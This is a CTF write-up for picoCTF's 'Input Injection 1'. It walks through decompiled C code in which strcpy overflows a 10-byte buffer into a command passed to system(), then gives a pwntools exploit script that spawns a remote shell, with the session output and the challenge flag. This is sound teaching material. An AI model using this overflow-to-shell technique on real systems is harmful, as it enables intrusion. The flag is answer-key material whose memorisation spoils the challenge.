---
title: "PicoCTF - Input Injection 1"
description: "PicoCTF Writeup for Input Injection 1 Challenge"
date: 2025-11-21 00:00:00 +0900
categories: [CTF Writeup, PicoCTF]
tags: [binary exploitation, medium]
image: https://media.licdn.com/dms/image/v2/D5612AQGkPy4coqfHLg/article-cover_image-shrink_720_1280/article-cover_image-shrink_720_1280/0/1731516817853?e=1765411200&v=beta&t=xbU-0i3aLArJihFrGtmI-gNLs2z3cE-WbuhcJa9tjZQ
---

PicoCTF Challenge: 
[https://play.picoctf.org/practice/challenge/525?category=6&page=1](https://play.picoctf.org/practice/challenge/525?category=6&page=1)

> ## Input Injection 1
> Author: Yahaya Meddy
> 
> ### Description
> A friendly program wants to greet youâ€¦ but its goodbye might say more than it should. Can you convince it to reveal the flag?<br>
> Additional details will be available after launching your challenge instance.<br>
> ### Hints
> 1st - Look closely at how the program stores and uses your input.<br>
> ### Resources:
> Source Code: [/vuln.c](https://challenge-files.picoctf.net/c_amiable_citadel/f07a7a8e27ed4f0cecb06246bfaea62c751792f0c304249ab6f69da34647f9ac/vuln.c)<br>
> Binary: [/vuln](https://challenge-files.picoctf.net/c_amiable_citadel/f07a7a8e27ed4f0cecb06246bfaea62c751792f0c304249ab6f69da34647f9ac/vuln)<br>

## Decompile

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
    char s[208]; // [rsp+0h] [rbp-D0h] BYREF

    puts("What is your name?");
    fflush(stdout);
    fgets(s, 200, stdin);
    s[strcspn(s, "\n")] = 0;
    fun(s, "uname");
    return 0;
}

int __fastcall fun(const char *a1, const char *a2)
{
    char v3[10]; // [rsp+1Ch] [rbp-14h] BYREF
    char dest[10]; // [rsp+26h] [rbp-Ah] BYREF

    strcpy(dest, a2);
    strcpy(v3, a1);
    printf("Goodbye, %s!\n", v3);
    fflush(stdout);
    return system(dest);
}
```

The code above is the decompiled source code from a binary. Let me summarize it more concisely.

```c
int main(int argc, const char **argv, const char **envp)
{
    char input_string[208];

    puts("What is your name?");
    fflush(stdout);
    fgets(input_string, 200, stdin);
    input_string[strcspn(input_string, "\n")] = 0;
    fun(input_string, "uname");
    return 0;
}

int fun(const char *input_string, const char *command)
{
    char input_buffer[10];
    char command_buffer[10];

    strcpy(command_buffer, command);
    strcpy(input_buffer, input_string);
    printf("Goodbye, %s!\n", input_buffer);
    fflush(stdout);
    return system(command_buffer);
}
```

## Analysis

### Security Check
```bash
rusty@rusty-TravelMate-P214-53:~/Documents/01_PicoCTF/02_Input Injection 1$ checksec ./vuln
[*] '/home/rusty/Documents/01_PicoCTF/02_Input Injection 1/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

| Security Feature      | Present                       |
|:----------------------|:------------------------------|
| RELRO                 | Partial RELRO                 |
| Stack                 | No canary found               |
| NX                    | NX enabled                    |
| PIE                   | No PIE (0x400000)             |
| SHSTK                 | Enabled                       |
| IBT                   | Enabled                       |
| Stripped              | No                            |


### Vulnerability
This program has a BOF (BufferOverFlow) vulnerability in `fun()` function.
The `input_buffer` variable can take 10 bytes of data.
However, in `main()` function, `fgets()` function take a user input up to 200 bytes.
This means we can perform a BOF attack using `input_buffer` variable.

```bash
rusty@rusty-TravelMate-P214-53:~/Documents/01_PicoCTF/02_Input Injection 1$ ./vuln
What is your name?
test
Goodbye, test!
Linux

```

It seems like the program is running with no errors, successfully executing `uname` command using `system()` function before exiting.

Let's try to fuzz the `input_string` variable and find the offset of the `command_buffer` variable.

```bash
>>> import string;string.printable
'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c'
```

```bash
rusty@rusty-TravelMate-P214-53:~/Documents/01_PicoCTF/02_Input Injection 1$ ./vuln
What is your name?
0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
Goodbye, 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!
sh: 1: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ: not found
Segmentation fault (core dumped)
```

Since the string `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ` appears, it indicates that the offset is:

```bash
>>> len('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'.split('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')[0])
10
```

Therefore, after 10 bytes of characters, I can overwrite the  `command_buffer` variable which will ultimately execute an arbitrary code using `system()` function.

## Exploit Script

```python
from argparse import ArgumentParser
from pwn import *

def generate_payload():
    offset = 10
    
    payload = b'A' * offset
    payload += b"/bin/sh"
    
    return payload

def main(target: str, port: int):
    print(f"[~] Connecting to [{target}]:{port}...")
    s = remote(
        host=str(target),
        port=int(port)
    )
    response = s.recvline().decode()
    print(f"[+] Received responses: {len(response)}B")

    payload = generate_payload()
    print(f"[+] Payload has been generated: {len(payload)}B")

    s.sendline(payload)
    print(f"[+] Payload has been delivered.")

    print("[~] Switching to the interactive shell (/bin/sh)...")
    s.interactive()


if __name__ == "__main__":
    parser = ArgumentParser(
        prog="PicoCTF Exploit - Input Injection 1",
        description="PicoCTF RCE Exploit (PicoCTF - Input Injection 1)"
    )
    parser.add_argument(
        "-t", "--target",
        required=True,
        type=str
    )
    parser.add_argument(
        "-p", "--port",
        required=True,
        type=int
    )

    args = parser.parse_args()

    context.log_level = 'warning'

    main(args.target, args.port)
```

## Result
```bash
rusty@rusty-TravelMate-P214-53:~/Documents/01_PicoCTF$ python3 ./02_Input\ Injection\ 1/exploit.py -t amiable-citadel.picoctf.net -p 61741
[~] Connecting to [amiable-citadel.picoctf.net]:61741...
[+] Received responses: 19B
[+] Payload has been generated: 17B
[+] Payload has been delivered.
[~] Switching to the interactive shell (/bin/sh)...
Goodbye, AAAAAAAAAA/bin/sh!
$ whoami
ctf-player
$ ls
flag.txt
$ cat flag.txt
picoCTF{0v3rfl0w_c0mm4nd_3185bc8f}$  
```

Therefore, the flag is: `picoCTF{0v3rfl0w_c0mm4nd_3185bc8f}`